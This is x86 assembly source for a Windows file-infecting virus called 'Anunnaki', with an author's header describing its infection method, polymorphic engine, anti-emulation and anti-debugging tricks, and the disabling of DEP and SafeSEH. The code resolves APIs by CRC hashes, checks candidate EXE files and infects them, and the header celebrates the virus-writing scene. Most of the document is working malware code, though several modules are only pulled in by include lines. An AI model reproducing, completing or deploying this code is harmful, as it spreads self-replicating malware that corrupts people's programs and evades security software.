;-----------------------------------------------------------------------------------------;
;          _____                                     __   .__                             ;
;         /  _  \   ____  __ __  ____   ____ _____  |  | _|__|                            ;
;        /  /_\  \ /    \|  |  \/    \ /    \\__  \ |  |/ /  |                            ;
;       /    |    \   |  \  |  /   |  \   |  \/ __ \|    <|  |                            ;
;       \____|__  /___|  /____/|___|  /___|  (____  /__|_ \__|                            ;
;               \/     \/           \/     \/     \/     \/                               ;
;-----------------------------------------------------------------------------------------;
; Virus information                                                                       ;
;   Virus name       -   Anunnaki                                                         ;
;   Virus version    -   DA (1.00)                                                        ;     
;   Virus author     -   Prophet/EOF                                                      ;
;   Author contact   -   null                                                             ;
;   Virus type       -   Direct action infector infecting files in current directory      ;
;   Target files     -   Exe files                                                        ;             
;   Target OS        -   Win2k/2003/xp/vista/2008/win7                                    ;
;   Infection type   -   Appending last section                                           ;
;   Infection mark   -   No more epo patches can occur                                    ;
;   Polymorphic      -   OPE2 (Offensive polymorphic engine 2 by prophet/eof)             ;
;                    -   Sliding 32bit key (xor/add/sub)                                  ;
;   EPO              -   Patching ExitProcess/exit/_exit                                  ;
;                        with call rel32/call dword ptr [mem32]                           ;
;   Payload          -   Message box                                                      ;
;   Armoured         -   Anti-emulation(GetLastError,SSE)                                 ;
;                    -   Detect SW breakpoints                                            ;
;                        Check API ep's for bpx,that can stop even lame sanboxes          ;
;   Apis resolving   -   Using CRC                                                        ;
;   Other features   -   Not using Delta offset                                           ;
;                    -   Randomly abort infection                                         ;     
;                    -   Last section isnt(usually) set to writable (anti-herusticts)     ;
;                    -   Insert random bytes before and after virus body                  ;
;                    -   Using SEH to handle errors                                       ;
;                    -   Update or generate Checksum for infected file                    ;
;                    -   Due the trash-bytes and poly_layers ,size of virus is variable   ;
;   DEP support      -   Set Nx_Compatible flag in DLLCharacteristics to zero             ;  
;                        Im not 100% sure if this disable both SW/HW DEP                  ;
;   ASLR support     -   Implicit - neither virus nor decryptors are position dependant   ;
;   SafeSeh support  -   Disable SafeSEH and use custom SEH handlers                      ;
;                        Zero-out the LoadConfig table directory entry in optional header ;
;-----------------------------------------------------------------------------------------;
; Greetz to EOF guys                                                                      ;     
;       izee      -  thank you for everything pal                                         ;
;       pr0mix    -  welcome to the team and thx for help                                 ;
;       fAMINE    -  thx for inspirational talks                                          ;     
;       berniee   -  wake up from ur hiatus man                                           ;
;       wargame   -  maybe we could contact each other finally                            ;
;       tanMa     -  alive ?                                                              ;
;       kaze/FAT  -  thx for indirect help :)                                             ;     
;       other pals ...                                                                    ;
;-----------------------------------------------------------------------------------------;
; Additional info                                                                         ;
;       I have coded this virus for fun,and to learned alot.                              ;
;       Watch new releases at eof-project or vx.netlux.                                   ;
;       Poly engine used in virus will be released in near future as the version i        ;
;       used virus has restricted functionalities to avoid buggy decryptors.              ;
;       If you would like to contact me,ask izee for my contact information.              ;
;                                                                                         ;
; Epilogue                                                                                ;     
;       The 'death' of the scene was anounced by bad voices few years ago,                ;
;       yet, we are still here.                                                           ;
;                                                                                         ;
;       There are hundreds of ppl doing their vxing as the hobby,                         ;
;       academical research or as their jobs.                                             ;
;       VXing cannot die.                                                                 ; 
;       VXing is an idea , ideas cannot die.                                              ;
;       With so many platforms,technologies developed every year,number                   ;
;       of potentional spreading channels is growing up.There will always be ppl          ;
;       who get an idea "how could i infect that,and spread over it".                     ;
;       Let's see what will future bring.                                                 ;
;                                                                                         ;
;   prophet/EOF 20.10.09                                                                  ;
;-----------------------------------------------------------------------------------------; 
; Read license before using this program                                                  ;
;-----------------------------------------------------------------------------------------;
            .586
            .model flat , stdcall
    
            include macros.inc
            include windows.inc 
            include anunnaki.inc

            VIRUS_SIZE          =  VIRUS_END   -   VIRUS_START
            VIRUS_MEM_ALLOC_SIZE    =  VIRUS_SIZE + 10000h 
            VIRUS_POLY_LAYERS_MAX   =  1 
            VIRUS_TRASH_BYTES_MAX   =  1000h ; ( minimal val 1 = no trash )
            VIRUS_POLY_LAYERS_MAX   =  3 
            
            RANDOM_ABORT        =  1 ; randomly abort infection (comment out to disable)
            ABORT_CHANCE        =  3 ; 1 out of 3 infections is aborted  
                
            VIRUS_STATE_MAKE_LAST_WRITABLE = 1 
            
            assume ebp:ptr vars
.code

START:
;-----------------------------------------------------------------------------;
;                                VIRUS START                                  ;  
;-----------------------------------------------------------------------------;                         
VIRUS_START:        call get_ep
            mov ebx,eax
                
            ; setup SEH
            @SEH_SetupFrame <jmp seh_exit> 
            
            call stopemul ; try to stop emulation 

            sub esp,sizeof vars ; alloc space for vars 
            mov ebp,esp     ; use ebp as pointer to vars base 
                
            ; fill with zeores
            mov edi,esp
            mov ecx,sizeof vars
            xor eax,eax
            rep stosb
                
            call antiemul2 ; second attempt to stop emulation 

            mov dword ptr [ebp].OrigVirusEntryVa,ebx
    
            ; avers can detect constants at stack during emulation 
            ; thats why i tryed to stop emulation before this part
            push 0
            push 02B0B47A5h  ; OutputDebugStringA
            push 0A7FB4165h  ; GetFileSize
            push 0251097CCh  ; ExitProcess
            push 0391AB6AFh  ; UnmapViewOfFile
            push 0A89B382Fh  ; MapViewOfFile
            push 0B41B926Ch  ; CreateFileMappingA ; problem 
            push 0553B5C78h  ; CreateFileA
            push 0D82BF69Ah  ; FindClose
            push 075272948h  ; FindNextFileA
            push 0C9EBD5CEh  ; FindFirstFileA
            push 072F11E39h  ; MultiByteToWideChar
            push 0334971B2h  ; GetCurrentDirectoryW
            push 0B09315F4h  ; CloseHandle
            push 03FC1BD8Dh  ; LoadLibraryA ; problem
                
            call get_kernel
            mov ebx,eax
            xor ecx,ecx
                
get_apis_loop:      cmp dword ptr [esp],0
            je get_apis_end
            push ebx
            call GetProcAddressCrc

            test eax,eax
            jnz @f

            ; api retrieve failed , cause exception
            add dword ptr [eax],ebx
                
            ;  test if bpx was used at API
@@:         push eax
            call detect_bpx
            test eax,eax
            pop eax
            jz no_bpx
                
            ; bpx was detected , fire SEH to exit virus
            mov dword ptr [eax],esi   
                
no_bpx:         mov dword ptr [ebp + ecx], eax
            add ecx,4
            jmp get_apis_loop
get_apis_end:                   
;-----------------------------------------------------------------------------;
;                      get SFC support if available                           ;
;-----------------------------------------------------------------------------;
check_sfc:      push    'so'
            push    '_cfs'  ;Windows XP (forwarder chain from sfc.dll)

            push    esp
            call    [ebp].aLoadLibrary
            add esp,8
            test    eax, eax
            jne found_sfc
            push    'cfs'   ;Windows Me/2000
            push    esp
            call    [ebp].aLoadLibrary
            add esp,4
    
            test    eax, eax
            jz sfc1

found_sfc:      push 03A793033h ; SfcIsFileProtected 
            push eax
            call GetProcAddressCrc
            mov dword ptr [ebp].aSfcIsFileProtected, eax
sfc1:               
;-----------------------------------------------------------------------------;
;                               virus body                                    ;                                 
;-----------------------------------------------------------------------------;                         
            ; init random_seed 
            rdtsc
            mov dword ptr [ebp].random_seed, eax
     
            call SearchFiles
    
            call payload 
;-----------------------------------------------------------------------------;
;                               virus exit                                    ;
;-----------------------------------------------------------------------------;
;normal exit                            
            push 0
            call dword ptr [ebp].aExitProcess
            retn

; seh exit                              
seh_exit:       @SEH_RemoveFrame ; restore SEH 
                
            push_sz <ExitProcess\000>
            push esp
            call get_kernel
            push eax
            call MyGetProcAddress
            add esp,12 
                
            push 0
            call eax ; ExitProcess   
            retn 
                
; get ep to eax                                  
get_ep:         mov eax,dword ptr [esp]
            sub eax,5
            retn    
;-----------------------------------------------------------------------------;
;                            Infect File                                      ; 
;-----------------------------------------------------------------------------;
;eax = filename
InfectFile:     push eax ; is sfc protected
            call IsSfcProtected
            test eax,eax
            jnz InfectFail  
        
            mov eax,[esp]
            xor ecx,ecx ; map file with original size 
            call MapFile
            test eax,eax
            jz InfectFail
            
            call CheckFile
            test eax,eax
            jz InfectFailUnmap
            
            ; randomly abort infection 
ifdef RANDOM_ABORT  
            mov eax,ABORT_CHANCE
            call rand
            test eax,eax
            jz InfectFailUnmap
endif ; RANDOM_ABORT                            
                
IsPrepared:     mov eax,dword ptr [ebp].ptrMappedImage 
            mov ebx,dword ptr [esp] ; ebx = filename 
            call infect_3
                
InfectFailUnmap:    call UnmapFile
                
InfectFail:     add esp,4
            retn 
;---------------------------------------------------------------------------;
;                            check file                                     ; 
;---------------------------------------------------------------------------;
;__in  : eax = ptr mapped image 
;__out : eax = 1 file is siutable 
;        eax = 0 file isn't siutable for infection
CheckFile:      ; is valid PE header ?
            cmp word ptr [eax],'ZM'
            jne bad_file 
        
            add eax,dword ptr [eax + 3ch]
            cmp word ptr [eax],'EP'
            jne bad_file 
        
            add eax,4
            assume eax:ptr IMAGE_FILE_HEADER
        
            ; machine type 386+
            cmp [eax].Machine,IMAGE_FILE_MACHINE_I386
            jne bad_file 

            ; is dll ?
            mov bx,[eax].Characteristics
            cmp bh,IMAGE_FILE_DLL shr 8
            je bad_file 
        
            ; is 32bit executable image ??
            mov bx,[eax].Characteristics 
            and bx,IMAGE_FILE_EXECUTABLE_IMAGE OR IMAGE_FILE_32BIT_MACHINE
            cmp bx,IMAGE_FILE_EXECUTABLE_IMAGE OR IMAGE_FILE_32BIT_MACHINE
            jne bad_file
                
            xor ebx,ebx
            mov bx,word ptr [eax + 2] ; number of sections  
            mov dword ptr [ebp].number_of_sect,ebx
        
            xor ebx,ebx
            mov bx,word ptr [eax].SizeOfOptionalHeader
            add eax,sizeof IMAGE_FILE_HEADER
                
            mov dword ptr [ebp].ptr_opt_header,eax 
            cmp dword ptr [eax + 128],0 
            jne bad_file ; contains security directory 
                
            mov ecx,dword ptr [eax + 16] ; address of entry point
        
            ;is win GUI or win CUI ?
            cmp word ptr [eax + 68],IMAGE_SUBSYSTEM_WINDOWS_GUI
            jb bad_file
            cmp word ptr [eax + 68],IMAGE_SUBSYSTEM_WINDOWS_CUI
            ja bad_file

            add eax,ebx
            mov dword ptr [ebp].ptr_sect_headers,eax 
        
            ;is first section .text or CODE
            cmp dword ptr [eax],'xet.'
            je cnt11

            cmp dword ptr [eax],'EDOC'
            jne bad_file
        
cnt11:          ;is OEP within first section ?
            mov ebx,dword ptr [eax + 12]
            cmp ecx,ebx ; is higher than virt_address
            jb bad_file ; is lower than code VA
            add ebx,dword ptr [eax + 8] ; add virtual size
            cmp ecx,ebx ; is within virtual size of code section
            jae bad_file
        
            ; check for installer
        
good_file:      xor eax,eax
            inc eax
            retn    
                
bad_file:       xor eax,eax
            retn 
;---------------------------------------------------------------------------;
;                                                       Prepare Virus                                                                   ;
;---------------------------------------------------------------------------;
; Allocate Buffer , Encrypt virus
; reserved for later use 
PrepareVirus:       ;pushad
            xor eax,eax
            inc eax
            
            ;mov dword ptr [esp + 1ch],1
PrepareOkay:        ;popad 
            retn 
                
            include epo.inc 
            include misc.inc
            include rand.inc
            include proc.inc 
            include apis.inc
            include antis.inc
            include infect.inc
            include payload.inc 
            include search_file.inc
            include poly_engine2.inc

            db "Anunnaki" 
            db "Go ahead (Alex).Make my day"
VIRUS_END:              
END START
